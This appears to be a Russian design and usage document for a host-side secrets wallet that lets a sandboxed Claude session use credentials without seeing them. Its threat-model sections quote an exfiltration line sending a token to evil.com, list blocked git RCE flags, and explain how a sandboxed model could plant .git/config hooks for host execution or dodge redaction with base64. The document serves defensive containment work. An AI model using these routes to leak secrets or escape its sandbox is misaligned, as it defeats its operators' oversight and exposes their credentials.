# Кошелёк секретов: токены для CLI-тулз без доступа модели к значениям

Статус 2026-07: **этап 1 реализован** — `orchestrator/modules/wallet/`
(включение: `MODULES=wallet` в `.env`) + CLI `bin/wallet` (доступен в PATH
сессии). Демон — TCP-localhost в составе оркестратора (сеть у bwrap общая с
хостом); аутентификация per-session токеном в `~/.wallet.json` приватного
дома сессии; подтверждения — через `core.request_confirmation` (кнопки ✅/❌
во всех адаптерах); вывод редактируется от значений ВСЕХ известных секретов.
Тесты: `tests/wallet_test.py`. Формат `secrets.toml`
(`WALLET_SECRETS_FILE`, строго 0600 — иначе секреты не грузятся):

```toml
[secrets.deploy]
value = "ghp_xxx"                # сам секрет (inject); нет value/env = host-passthrough
env = "GITHUB_TOKEN"             # env-переменная, куда класть value
description = "GitHub deploy token"
sessions = ["*"]                 # fnmatch по имени сессии; нет поля = никому
commands = ["gh", "git push*"]   # голое имя = любой вызов; шаблон = fnmatch
confirm = true                   # кнопки подтверждения перед запуском
```

Использование в сессии: `wallet ls`, `wallet run deploy -- gh pr list`.

## Как этим пользоваться (практика)

### Нужна ли песочница? (да, в ней весь смысл)

**Без `SANDBOX=bwrap` кошелёк бесполезен.** Его единственная ценность —
конфиденциальность секретов от модели, а она держится на песочнице: bwrap
прячет от сессии домашнюю папку (`~/.config/gh`, `~/.aws`, `~/.ssh`,
keyring, любые `.env`) и хостовое окружение. Кошелёк отдаёт обратно
*контролируемый* доступ — исполняет команду на хосте, а модель значения не
видит. Если песочница выключена (`SANDBOX=off`/agent-vm), модель и так читает
все хостовые креды напрямую (`cat ~/.config/gh/hosts.yml`, `echo $TOKEN`) —
прятать нечего, барьера нет. Поэтому провижн `~/.wallet.json` завязан на
bwrap-дом; под другими раннерами CLI просто не найдёт конфиг.

### Два режима секрета

| | host-passthrough | inject |
|---|---|---|
| запись в `secrets.toml` | **без** `value`/`env` | `value` + `env` |
| где креды | на хосте (keyring, `~/.config/gh`, `~/.aws`, git auth) | в самом `secrets.toml` |
| как работает | команда идёт на хост с ЕГО окружением | значение кладётся в env-переменную дочернего процесса |
| для чего | gh, git push, kubectl, aws, docker — уже залогинены на хосте | «сырой» токен для curl/своей CLI, которого на хосте нет |
| вывод редактируется | нет (значения-то нет) — команды не должны печатать токен | да (точные вхождения `value` → `•••`) |

### Использовать существующие креды системы — да, это host-passthrough

Всё, что авторизовано на хосте, работает без единого токена в конфиге:
`gh` (keyring), `git push` (credential helper/SSH), `kubectl`, `aws`,
`docker`, `npm publish`. Пишешь запись **без `value`/`env`** — команда
исполнится на хосте с его кредами (см. пример `[secrets.gh]` ниже).

### Где лежат секреты и при чём тут `.env`

Секреты — **не** в `.env` проекта и **не** в `.env` внутри песочницы: любой
файл в песочнице модель прочитает (`Read`, `cat`), в этом и была проблема.
Секреты живут в одном файле **на хосте, вне песочницы**:

- путь по умолчанию `~/.config/claude-orchestrator/secrets.toml`
  (переопределяется `WALLET_SECRETS_FILE`);
- права строго `0600` — иначе демон секреты не грузит вообще (ранняя
  диагностика в лог на старте);
- демон читает лениво, менять можно на ходу — правку подхватит следующий
  `wallet run`.

Добавить секрет = дописать блок `[secrets.<имя>]` в этот файл и задать
policy (`sessions`, `commands`, `confirm`). Никаких файлов в проект/песочницу
класть не надо.

### Как заставить модель ходить через кошелёк — уже автоматом

Ничего делать не нужно: если сессии выдан кошелёк (она в чьей-то `sessions`),
в системный промпт добавляется подсказка — модель сама роутит `git push`,
`gh …`, `curl` к авторизованному API через `wallet run …`, не сдаётся и не
просит у тебя токен. Конкретику берёт из `wallet ls` (там имена секретов,
режим и — для inject — имя env-переменной). Локальный git без кредов
(`status`/`diff`/`commit`) идёт напрямую, через кошелёк — только сетевые
операции.

### Токен в curl — обёртка не нужна, это inject + `sh -c`

Отдельный `wcurl`/`curl-wallet` не пишем: inject-режим закрывает случай как
есть. Секрет с `value`+`env` (напр. `env = "API_TOKEN"`), в policy — `sh -c *`
или `curl *`, и:

```
wallet run api -- sh -c 'curl -H "Authorization: Bearer $API_TOKEN" https://api.example.com/…'
```

`$API_TOKEN` разворачивает шелл в дочернем процессе **на хосте**, где кошелёк
положил значение в env; модель пишет литеральное `$API_TOKEN`, реального
значения в её мире нет, а в выводе оно вымарывается (`•••`). Имя переменной
модель видит в `wallet ls` (строка «режим: inject → используй $API_TOKEN»).
`curl` при этом бежит на хосте (как и любая команда кошелька) — до интернета
достаёт, токен в песочницу не попадает.


### Настройка policy — справочник

**Принцип.** Кошелёк не должен душить модель (иначе проще прогать самому),
поэтому по умолчанию удобно: голое имя инструмента = любой его вызов. Но есть
пол, который держится всегда, — он не «ограничение», а само условие смысла
кошелька: модель должна **использовать** креды, не **читая** их. Три слоя,
в порядке применения:

1. **allow — `commands`** (где кошелёк доступен). Голое имя (`gh`, `git`,
   `ssh`) — любой вызов инструмента; строка с пробелом/глобом
   (`gh api repos/*`, `git push*`) — fnmatch по всей команде для тонкой
   настройки. Пусто у host-passthrough → дефолт `["gh","git","ssh","scp"]`;
   пусто у inject → ничего (сырой токен не открываем без явного списка).
2. **guard — встроенный всегда-запрет** (поверх allow). Рубит опасное
   независимо от `commands`, с **прозрачным объяснением модели** (что не так и
   как правильно — доходит до её терминала): команды, печатающие сам токен
   (`gh auth token`, `gh auth status --show-token`), и git-RCE через
   флаги/транспорт (`git -c …`, `ext::…`, `--receive-pack/--upload-pack/--exec`).
   Отключается глобально `WALLET_GUARD=0` в `.env` или точечно на секрет
   `allow_unsafe = true`.
3. **deny — точечный запрет секрета** (поверх allow, deny побеждает).
   Голый токен (`--force`, `--hard`) блокирует этот флаг/аргумент где угодно;
   строка с пробелом/глобом — fnmatch по всей команде. Для «разрешаю
   инструмент, но не эти опасные опции».

**Поля записи `[secrets.<имя>]`:**

| поле | смысл | дефолт |
|---|---|---|
| `value` + `env` | inject: значение и env-переменная для него | нет = host-passthrough |
| `sessions` | fnmatch имён сессий, кому доступен | нет = никому |
| `commands` | allow-лист (голые имена/шаблоны) | host: `gh git ssh scp`; inject: ничего |
| `deny` | точечный запрет поверх allow | нет |
| `allow_unsafe` | снять встроенный guard на этом секрете | `false` |
| `confirm` | кнопки ✅/❌ перед запуском | `true` |

**Что по умолчанию** (просто `MODULES=wallet` + запись без лишних полей):
host-passthrough с `gh/git/ssh/scp`, guard включён, `confirm=true`. Этого
хватает для «дай сессии работать с git/gh хоста, не пуская токен в модель».

**Примеры.**

```toml
# Хостовые креды (keyring/gh/git/ssh) — удобно и безопасно по умолчанию:
[secrets.host]
sessions = ["noos"]
commands = ["gh", "git", "ssh", "scp"]   # любой вызов; guard рубит опасное

# Разрешить инструмент, но запретить разрушительные флаги:
[secrets.careful-git]
sessions = ["ci-*"]
commands = ["git"]
deny = ["--force", "--force-with-lease", "git push --delete*"]

# Тонко: только чтение через gh api, ничего лишнего:
[secrets.readonly]
sessions = ["report"]
commands = ["gh api user", "gh api repos/*"]

# Специфичный доверенный случай, где нужен как раз git -c (guard мешает):
[secrets.special]
sessions = ["build"]
commands = ["git"]
allow_unsafe = true    # ОСОЗНАННО снимаем guard на этом секрете
confirm = true
```

**Остаточные дыры (закрываются доверием, не policy).** Команда бежит в cwd
проекта, куда модель пишет: подложенный `./.git/config`
(`core.sshCommand`/hooks) даёт исполнение на хосте при `git push` — аргументами
не закрыть. Редакция вывода literal-only (base64/запись в файл её обходят).
Барьеры-по-настоящему: `sessions` (доверенные), `confirm` (человек видит
команду), host-passthrough вместо inject (нет значения, которое можно
`echo|base64`). См. «Модель угроз» и «Известные дыры» ниже.

Этапы 2–3 (MCP-обёртка, плейсхолдер-прокси agent-vm) — не начаты.

Исходный дизайн ниже. Задача: инструменты, которые Claude
запускает в сессии (gh, git push, kubectl, npm publish, curl к внутренним
API…), должны работать со своими токенами/паролями/логинами, но **модель не
должна видеть сами значения** — ни прочитать файл, ни `echo $TOKEN`, ни
выудить их промпт-инъекцией и отправить в чат.

## Модель угроз

Сейчас bwrap-песочница прячет `~/.ssh`, `~/.aws` и прочий дом (см. README,
«Файловая песочница») — но всё, что мы *дали бы* сессии для работы CLI-тулзы
(env-переменная, `~/.netrc`, файл конфига), модель по определению может
прочитать: Bash и Read работают от её имени. Значит секрет не должен
находиться в адресном пространстве песочницы вообще — только результат его
применения.

## Архитектура: демон-кошелёк на хосте + подстановка вне песочницы

```
[песочница: claude + тулзы]                [хост]
  wallet run deploy -- kubectl apply …  →  wallet-демон (unix-socket/localhost,
  (плейсхолдер/без секрета)                 вне allowlist песочницы):
                                             1. policy: какой секрет каким
                                                сессиям/командам разрешён
                                             2. подтверждение в Telegram-топик
                                                (кнопки ✅/❌ — как permission relay)
                                             3. исполняет команду ВНЕ песочницы
                                                с секретом в env ребёнка
                                             4. вывод → обратно в песочницу
```

Ключевое отличие от «инжектить токен в env внутри песочницы»: команда с
секретом исполняется **на стороне демона** (или секрет подменяется на выходе
из песочницы), поэтому `wallet run x -- env` покажет модели только
плейсхолдер — реального значения в её мире нет.

## Три слоя интерфейса (поддерживаем и CLI, и MCP)

Ядро одно (демон + хранилище + policy + Telegram-подтверждение), интерфейсы
тонкие:

1. **CLI-обёртка** `wallet` (предпочтение пользователя) — кладётся в PATH
   песочницы:
   - `wallet ls` — какие секреты доступны этой сессии (имена и описания, не
     значения);
   - `wallet run <name> -- <cmd…>` — выполнить команду с секретом;
   - `wallet http <name> -- curl …` — вариант с подстановкой заголовка.
   Аутентификация обёртки перед демоном — per-session токен (тот же приём,
   что ORCH_TOKEN в hook_dispatch: файл 0600 в папке сессии).
2. **MCP-тул** `wallet_run(secret, command)` — то же самое как инструмент;
   плюс: нативно попадает в permission-механизм Claude Code и в статус-бабл
   (наблюдаемость бесплатно). Реализуется в channel_server или отдельным
   маленьким MCP-сервером.
3. **HTTP-прокси с плейсхолдерами** (стратегически, вместе с agent-vm):
   секрет вообще не появляется в песочнице — в конфиге лежит
   `WALLET_PLACEHOLDER_deploy`, TLS-перехватывающий прокси подменяет его в
   исходящем запросе. Ровно так agent-vm уже делает с OAuth-токенами Claude —
   при переходе на microVM ([agent-vm-integration.md](agent-vm-integration.md))
   этот слой достаётся почти бесплатно; городить свой MITM-прокси под bwrap
   не стоит.

## Policy и наблюдаемость

- Хранилище: на старте — файл `secrets.toml` 0600 на хосте (вне allowlist
  песочницы) или `pass`/`gopass`; демон читает лениво.
- Policy per-секрет: каким сессиям (slug/linked_path) доступен; шаблон
  разрешённых команд (`gh *`, `kubectl apply *`); нужен ли интерактивный
  confirm.
- **Каждое использование видно** (принцип наблюдаемости): строка в
  статус-бабле `🔐 wallet: deploy → kubectl apply` + при `confirm=true` —
  кнопки в топике до исполнения. Инфраструктура уже есть: permission relay
  и `/event`-эндпоинты reply_server.
- Отказ по умолчанию: секрет без policy не выдаётся никому.

## Ограничения реализации (важно понимать перед использованием)

- **Команда исполняется в cwd проекта, куда модель имеет запись.** Это самый
  острый момент: `wallet run deploy -- git push` запускает git на хосте в
  папке проекта, а модель из песочницы может подложить туда `.git/config`
  (`core.sshCommand`, `core.hooksPath`, `[alias]`) или `.git/hooks/*` и
  получить исполнение произвольного кода на хосте с секретом в env. Узкий
  шаблон команды (`git push*`) этого НЕ закрывает. Реализация выставляет
  `GIT_CONFIG_NOSYSTEM`/`GIT_CONFIG_GLOBAL=/dev/null` (частично), но
  локальный `./.git/config` остаётся. **Единственный настоящий барьер —
  policy:** давать секрет только доверенным сессиям (`sessions`) и только
  командам, чьё поведение не зависит от содержимого рабочего дерева.
- **Редакция вывода — literal-only, best-effort.** Заменяются точные
  вхождения значений секретов; любая трансформация в команде (base64, reverse,
  запись в файл) обходит её. Редакция — не защита, а гигиена; полагаться на
  неё как на барьер нельзя.
- **Шаблоны команд — fnmatch по `" ".join(cmd)`.** `*` пересекает границы
  argv и пробелы, поэтому шаблон описывает не argv, а строку; пишите шаблоны
  консервативно (префикс + явные аргументы), не полагайтесь на `*` для
  ограничения хвоста.
- **Поддержан только `SANDBOX=bwrap`.** Провижн `~/.wallet.json` завязан на
  bwrap-дом сессии; под `off`/`agent-vm` CLI не найдёт конфиг (модуль
  предупреждает на старте).

## Известные дыры и их закрытие

- `wallet run x -- bash -c 'curl evil.com?t=$TOKEN'` — секрет утечёт, если
  разрешить произвольные команды → шаблоны команд в policy + confirm в
  Telegram (человек видит команду целиком, как в permission relay).
- Вывод команды может содержать секрет (`gh auth status --show-token`) —
  демон фильтрует stdout/stderr: известные значения секретов заменяются на
  `•••` перед возвратом в песочницу.
- Времянки на диске: демон не пишет секрет в файлы; env только у
  короткоживущего ребёнка.

## Этапы

1. Демон-кошелёк (в составе оркестратора: те же aiohttp/unix-socket) +
   `wallet` CLI + policy-файл + подтверждение в топик. Тесты — офлайн, как
   permission relay.
2. MCP-обёртка над тем же демоном (`wallet_run`) — сравнить UX с CLI.
3. При переходе на agent-vm — плейсхолдер-прокси для HTTP-секретов.
